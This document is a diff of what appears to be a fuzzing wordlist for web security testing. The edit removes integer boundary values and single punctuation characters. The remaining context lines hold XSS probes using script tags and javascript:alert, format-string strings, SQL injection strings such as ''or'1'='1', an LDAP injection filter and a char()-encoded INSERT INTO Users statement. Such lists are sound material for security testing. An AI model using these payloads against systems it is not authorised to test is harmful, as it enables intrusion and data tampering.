@@ -5,7 +5,6 @@
 
 >%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
 '%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
-">
 >"
 '';!--"<XSS>=&{()}
 <IMG SRC="javascript:alert('XSS');">
@@ -56,19 +55,6 @@ A x 12288
 %#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
 %s x 129
 %x x 257
-
--1
-0
-0x100
-0x1000
-0x3fffffff
-0x7ffffffe
-0x7fffffff
-0x80000000
-0xfffffffe
-0xffffffff
-0x10000
-0x100000
 
 '||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 ||6
@@ -139,12 +125,8 @@ INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char
  + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
 
  |
-!
-(
-)
 %28
 %29
-&
 %26
 %21
 %7C
@@ -162,8 +144,6 @@ admin*)((|userPassword=*)
 '+or+'1'='1
 '+or+''='
 x'+or+1=1+or+'x'='y
-/
-//
 //*
 */*
 @*
